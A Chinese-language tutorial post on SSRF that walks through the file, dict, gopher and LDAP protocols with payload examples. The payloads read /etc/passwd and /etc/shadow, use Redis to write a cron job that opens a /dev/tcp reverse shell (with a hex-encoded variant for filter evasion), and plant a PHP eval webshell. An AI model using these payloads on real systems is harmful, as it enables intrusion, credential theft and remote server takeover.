---
title: SSRF 服务器端请求伪造
date: 2026-08-24 13:30:00
categories:
  - Web安全
tags:
  - SSRF
description: SSRF 服务器端请求伪造
---

SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。
一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）

# SSRF攻击中常用协议
### http协议（超文本传输协议）

用于在Web浏览器和服务器之间传输网页和数据的**通信规则**。
 核心特点：
1. **请求-响应模型**
    浏览器（客户端） → 发送请求 → 服务器
    浏览器（客户端） ← 返回响应 ← 服务器
    
2. **无状态**
    每次请求都是独立的，服务器不记得你之前来过
    需要Cookie/Session来保持登录状态
    
3. **明文传输**（HTTPS是加密版）
    HTTP：数据像明信片，谁都能看到
    HTTPS：数据像密封的信件，更安全

### file协议（文件协议）

用于访问服务器本地文件系统：

**file协议数据格式：**

file://文件绝对路径名

例如：

```
file:///etc/passwd
file:///var/www/html/index.php
file:///usr/local/apache-tomcat/conf/server.xml
```

```
http://target.com/fetch?url=file:///etc/passwd
http://target.com/fetch?url=file://C:/Windows/win.ini
```

高级利用技术：

1. **路径遍历**：结合路径遍历技术访问任意文件。

```
http://target.com/fetch?url=file:///var/www/html/../../../etc/shadow
```

1. **特殊文件访问**：访问特殊文件获取系统信息。

```
http://target.com/fetch?url=file:///proc/self/environ
http://target.com/fetch?url=file:///proc/self/cmdline
```

1. **目录列表**：某些实现可能允许列出目录内容。

```
http://target.com/fetch?url=file:///var/www/html/
```
### dict协议(字典协议)

dict协议一般常用来探测内网主机以及端口开放情况，既然能够探测端口，那么可以探测不同端口对应的服务的指纹信息。当然dict协议也可以用来执行一些服务的命令，如redis

- 内网主机探测
- 开放端口探测
- 端口服务指纹探测
- 执行命令

注意：dict执行命令多行操作的命令时，只能一次执行单行，需分多次执行。

**dict协议数据格式：**

- ditc://ip:port
- ditc://ip:port/命令

例如：
一、dict协议探测端口和服务指纹
```php
dict://127.0.0.1:22
dict://172.22.10.10:3306
dict://127.0.0.1:6379/info
```

二、dict协议攻击redis，写入定时任务，进行反弹shell
centos系统定时任务的路径为：/var/spool/cron
debian系统定时任务的路径为：/var/spool/cron/crontabs

```php
dict://127.0.0.1:6379/config:set:dbfilename:root
dict://127.0.0.1:6379/config:set:dir:/var/spool/cron
dict://127.0.0.1:6379/set:test:"\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/10.10.10.10/1234 0>&1\n\n"
dict://127.0.0.1:6379/save
```

注意：若payload存在被转义或过滤的情况，可利用16进制写入内容
```php
dict://127.0.0.1:6379/set:test:"\n\n\x2a/1\x20\x2a\x20\x2a\x20\x2a\x20\x2a\x20/bin/bash\x20\x2di\x20\x3e\x26\x20/dev/tcp/10.10.10.10/1234\x200\x3e\x261\n\n"
```

三、dict协议攻击redis，写入webshell
```php
dict://127.0.0.1:6379/config:set:dbfilename:test.php
dict://127.0.0.1:6379/config:set:dir:/var/www/html
dict://127.0.0.1:6379/set:test:"\n\n<?php @eval($_POST[x]);?>\n\n"
dict://127.0.0.1:6379/save
```
 若存在过滤， 则利用16进制内容写入：
```
dict://127.0.0.1:6379/set:test:"\n\n\x3c\x3f\x70\x68\x70\x20\x40\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x78\x5d\x29\x3b\x3f\x3e\n\n"
```

四、Redis命令执行：利用dict协议与Redis服务交互。

```php
http://target.com/fetch?url=dict://192.168.1.10:6379/info
http://target.com/fetch?url=dict://192.168.1.10:6379/CONFIG SET dir /var/www/html/
```

五、Memcached数据提取：
访问Memcached服务获取缓存数据。

```php
http://target.com/fetch?url=dict://192.168.1.10:11211/stats
```

### gopher协议

[我的gopher协议笔记](https://github.com/Echoin-613/image/blob/main/%E9%83%A8%E5%88%86%E7%AC%94%E8%AE%B0/gopher%20%E5%8D%8F%E8%AE%AE.md)
gopher协议在ssrf的利用中一般用来攻击**redis，mysql，fastcgi，smtp**等服务。

**gopher协议数据格式：**

gopher://ip:port/_TCP/IP数据流

**注意：**

- gopher协议数据流中，url编码使用%0d%0a替换字符串中的回车换行
- 数据流末尾使用%0d%0a代表消息结束

### ldap协议(**轻量目录访问协议**)

用于与LDAP目录服务交互：

```php
http://target.com/fetch?url=ldap://192.168.1.10:389/dc=example,dc=com
```

高级利用技术：

 **LDAP注入**：
 结合LDAP注入技术获取目录信息。

```php
http://target.com/fetch?url=ldap://192.168.1.10:389/dc=example,dc=com??sub?(uid=*)
```

**LDAP绑定操作**：
尝试使用不同凭证进行LDAP绑定。

# ssrf与redis的结合
(详见Redis笔记)

# ssrf与sql的结合

